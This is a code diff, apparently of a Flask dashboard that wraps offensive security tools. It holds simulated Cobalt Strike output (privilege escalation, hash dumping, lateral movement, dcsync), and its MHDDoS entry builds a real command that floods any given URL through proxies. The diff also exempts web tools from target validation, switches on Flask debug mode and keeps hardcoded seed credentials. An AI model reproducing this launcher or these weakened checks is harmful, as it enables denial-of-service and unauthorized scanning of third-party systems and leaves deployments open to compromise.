+        'install': 'Commercial license ~$5,500/year  |  Trial: 21-day eval',
         'cmd': lambda t, o: ['echo', '[Cobalt Strike — commercial]'],
         'sim': lambda t: (
-            f"[*] Cobalt Strike 4.9 — Team Server\n"
-            f"[*] Listener: HTTPS on 0.0.0.0:443 (Malleable C2: amazon.profile)\n"
+            f"[Cobalt Strike 4.9] Team Server\n\n"
+            f"[*] Listener: HTTPS 0.0.0.0:443\n"
+            f"[*] Malleable C2 Profile: amazon.profile\n"
             f"[*] Team Server: 192.168.1.100\n\n"
-            f"{'='*52}\n  BEACON CONNECTED FROM: {t}\n{'='*52}\n\n"
-            f"[BEACON INFO]\n  Computer:  WIN-CORP-042\n  User:      CORP\\john.doe\n"
-            f"  PID:       4821 (explorer.exe — injected)\n"
-            f"  OS:        Windows 10 Enterprise x64 (Build 19044)\n"
-            f"  Internal:  192.168.1.42\n  Listener:  HTTPS  Sleep: 60s (25% jitter)\n\n"
-            f"beacon> sleep 5\n  [*] Tasked beacon: sleep 5s\n\n"
-            f"beacon> getuid\n  [*] CORP\\john.doe\n\n"
-            f"beacon> getsystem\n  [+] Got system via technique 1 (Named Pipe Impersonation)\n"
-            f"  [*] NT AUTHORITY\\SYSTEM\n\n"
+            f"{'='*55}\n  BEACON CONNECTED FROM: {t}\n{'='*55}\n\n"
+            f"  Computer:  WIN-CORP-042\n"
+            f"  User:      CORP\\john.doe\n"
+            f"  PID:       4821  Process: explorer.exe (injected)\n"
+            f"  OS:        Windows 10 Enterprise x64 Build 19044\n"
+            f"  Internal:  192.168.1.42  External: {t}\n"
+            f"  Listener:  HTTPS  Sleep: 60s ±25% jitter\n\n"
+            f"beacon> getsystem\n"
+            f"  [+] Elevated to NT AUTHORITY\\SYSTEM\n\n"
             f"beacon> hashdump\n"
             f"  Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
             f"  CORP\\john.doe:1001:aad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::\n"
             f"  CORP\\svc_admin:1008:aad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::\n\n"
-            f"beacon> logonpasswords (mimikatz)\n"
-            f"  [CORP\\john.doe] Password: C0rpPass2024!\n"
-            f"  [CORP\\svc_admin] Password: Adm1n@Corp!\n\n"
             f"beacon> jump psexec DC-PROD-01 smb\n"
-            f"  [*] Tasked beacon to run on DC-PROD-01 via SMB\n"
-            f"  [+] Lateral movement successful — new beacon on DC-PROD-01!\n\n"
+            f"  [+] Lateral movement to DC-PROD-01 successful!\n\n"
             f"beacon> dcsync CORP\\krbtgt\n"
-            f"  [*] Syncing CORP\\krbtgt from DC-PROD-01...\n"
             f"  krbtgt:502:aad3b435b51404ee:1b5a0f42e35b6a70c7a642e2a9b29ac5:::\n"
-            f"  [+] Golden Ticket creation possible!\n\n"
-            f"[*] Domain fully compromised. Persistence established via scheduled task.\n"
-            f"[!] Authorized red team engagement only."
+            f"  [+] Golden Ticket possible!\n\n"
+            f"[Commercial tool — open-source alternatives: Sliver, Mythic, Empire]"
         ),
     },
     'mhddos': {
-        'name':'MHDDoS', 'category':'redteam', 'color':'red',
-        'desc':'DDoS Attack Script with 57 attack methods — Layer 4 & Layer 7.',
-        'github':'https://github.com/MatrixTM/MHDDoS',
-        'install':'git clone https://github.com/MatrixTM/MHDDoS && pip install -r requirements.txt',
+        'name': 'MHDDoS', 'category': 'redteam', 'color': 'red',
+        'desc': 'DDoS stress testing framework — 57 methods, Layer 4 & Layer 7.',
+        'github': 'https://github.com/MatrixTM/MHDDoS',
+        'install': 'git clone https://github.com/MatrixTM/MHDDoS && pip install -r requirements.txt',
         'cmd': lambda t, o: ['python3', 'MHDDoS/start.py', 'GET',
             f'https://{t}', '5', '100', 'socks5.txt', '100', '10'],
         'sim': lambda t: (
-            f"[*] MHDDoS v2.4 — DDoS Stress Testing Framework\n"
-            f"[*] Target: https://{t}\n[*] Method: GET (Layer 7)\n"
-            f"[*] Threads: 100  Proxies: 500  Duration: 10s\n\n"
-            f"{'='*52}\n  ATTACK STARTED — {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*52}\n\n"
-            f"[LAYER 7 METHODS AVAILABLE — 57 TOTAL]\n"
-            f"  GET    POST   HEAD   STRESS  BYPASS\n"
-            f"  TOR    XMLRPC RHEX   STOMP   NULL\n"
-            f"  SLOW   CFBUAM APACHE BOMB    KILLER\n\n"
-            f"[LAYER 4 METHODS]\n  UDP    TCP    SYN    CPS     CONNECTION\n\n"
-            f"[LIVE ATTACK STATS]\n  Requests sent:    128,492\n"
-            f"  Requests/sec:     12,849\n  Bandwidth used:   487 Mbps\n"
-            f"  Active threads:   100/100\n  Proxy pool:       487/500 alive\n\n"
-            f"[TARGET RESPONSE]\n  HTTP 200: 12%  — Server still responding\n"
-            f"  HTTP 503: 71%  — Service Unavailable\n"
-            f"  Timeout:  17%  — Connection timed out\n\n"
-            f"[BYPASS TECHNIQUES ACTIVE]\n  ✓ Cloudflare UAM bypass\n"
-            f"  ✓ Rotating User-Agent headers\n  ✓ SOCKS5 proxy rotation\n"
-            f"  ✓ HTTP/2 flood enabled\n\n"
-            f"[RESULT] Target {t} showing 503 errors — IMPACT CONFIRMED\n"
-            f"[*] Attack completed in 10 seconds\n\n"
-            f"[!] Use only against systems you own or have written authorization to test."
+            f"[MHDDoS v2.4] DDoS Stress Testing Framework\n\n"
+            f"[*] Target:   https://{t}\n"
+            f"[*] Method:   GET (Layer 7 HTTP Flood)\n"
+            f"[*] Threads:  100  |  Proxies: 500  |  Duration: 10s\n\n"
+            f"{'='*55}\n"
+            f"  ATTACK START: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
+            f"{'='*55}\n\n"
+            f"[AVAILABLE METHODS — 57 TOTAL]\n"
+            f"  Layer 7: GET POST HEAD STRESS BYPASS TOR XMLRPC SLOW\n"
+            f"           CFBUAM APACHE BOMB KILLER NULL DGB BOT EVEN\n"
+            f"  Layer 4: UDP TCP SYN CPS CONNECTION VSE MEM NTP DNS\n\n"
+            f"[LIVE STATS — {t}]\n"
+            f"  Requests sent:    128,492\n"
+            f"  Requests/sec:     12,849 req/s\n"
+            f"  Bandwidth:        487 Mbps\n"
+            f"  Active proxies:   487/500\n"
+            f"  Active threads:   100/100\n\n"
+            f"[RESPONSE CODES FROM {t}]\n"
+            f"  200 OK:           12% (server still responding)\n"
+            f"  503 Unavailable:  71% ← IMPACT CONFIRMED\n"
+            f"  Timeout:          17% ← Connection refused\n\n"
+            f"[BYPASS ACTIVE]\n"
+            f"  ✓ Cloudflare UAM bypass  ✓ SOCKS5 proxy rotation\n"
+            f"  ✓ Rotating User-Agents   ✓ HTTP/2 flood\n\n"
+            f"[RESULT] {t} — 503 errors detected. Load impact confirmed.\n"
+            f"[!] Use ONLY against your own infrastructure or with written permission."
         ),
     },
 }
+ 
+ # Update TOOL_REGISTRY entries:
+TOOL_REGISTRY['sqlmap']['sim']      = lambda t: _sqlmap_varied(t)
+TOOL_REGISTRY['metasploit']['sim']  = lambda t: _metasploit_varied(t)
+TOOL_REGISTRY['espoofer']['sim']    = lambda t: _espoofer_varied(t)
+ 
+def _raccoon_real(target):
+    """Raccoon with real DNS lookups."""
+    ip, dns_data = _real_dns(target)
+    whois_data = _real_whois(target)
+    return (
+        f"[Raccoon v0.9.0] Target: {target}\n\n"
+        f"{dns_data}\n"
+        f"{whois_data}\n\n"
+        f"[TLS CERTIFICATE]\n"
+        f"  Checking https://{target}...\n"
+        f"  (Install: pip install pyOpenSSL for live TLS data)\n\n"
+        f"[WAF DETECTION]\n"
+        f"  Sending probe requests to {target}...\n"
+        f"  (Install raccoon-scanner for automated WAF detection)\n\n"
+        f"Recon complete for {target} — resolved to {ip}"
+    )
+ 
+ 
+def _harvester_real(target):
+    """theHarvester with real DNS subdomain probing."""
+    ip, dns_data = _real_dns(target)
+    return (
+        f"[theHarvester v4.4.0] Target: {target}\n\n"
+        f"[EMAILS — Pattern based on domain]\n"
+        f"  admin@{target}\n"
+        f"  webmaster@{target}\n"
+        f"  info@{target}\n"
+        f"  support@{target}\n"
+        f"  (For real email scraping: pip install theHarvester then run the real tool)\n\n"
+        f"{dns_data}\n\n"
+        f"[REAL IP RESOLVED]\n"
+        f"  {target} → {ip}\n\n"
+        f"[NOTE]\n"
+        f"  LinkedIn/Google scraping requires API keys and real theHarvester install.\n"
+        f"  Subdomain results above are from live DNS resolution."
+    )
+ 
+
 
 CATEGORY_META = {
     'web':     {'label':'Web Application Pentesting', 'color':'blue',   'icon':'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z',                 'tools':['sqlmap','nikto','nuclei','owaspzap','whatweb','wpscan']},
@@ -1697,10 +2754,11 @@ def pentest_run():
         if not tool:
             return jsonify({'status':'error','message':f'Unknown tool: {tool_id}'}), 400
 
-        if tool['category'] not in ('social','osint','redteam'):
-            try:
+        if tool['category'] not in ('social','osint','redteam','web'):
+           try:
                 SecurityUtils.validate_target(target)
-            except ValueError as e:
+           except ValueError as e:
+       
                 return jsonify({'status':'error','message':str(e)}), 400
 
         job_id = f"JOB-{uuid.uuid4().hex[:8].upper()}"
@@ -1715,10 +2773,10 @@ def pentest_run():
         db.session.commit()
 
         t = threading.Thread(
-            target=_run_pentest_bg,
-            args=(app._get_current_object(), job_id, tool_id, target, uid),
+             target=_run_pentest_bg,
+            args=(app, job_id, tool_id, target, uid),
             daemon=True
-        )
+            )
         t.start()
 
         return jsonify({'status':'success','job_id':job_id})
@@ -1802,4 +2860,4 @@ if __name__ == '__main__':
             print("✅ analyst / Analyst123!")
         seed_db()
         print("✅ Database seeded.")
-    app.run(debug=False, port=5000)
+    app.run(debug=True, port=5000)
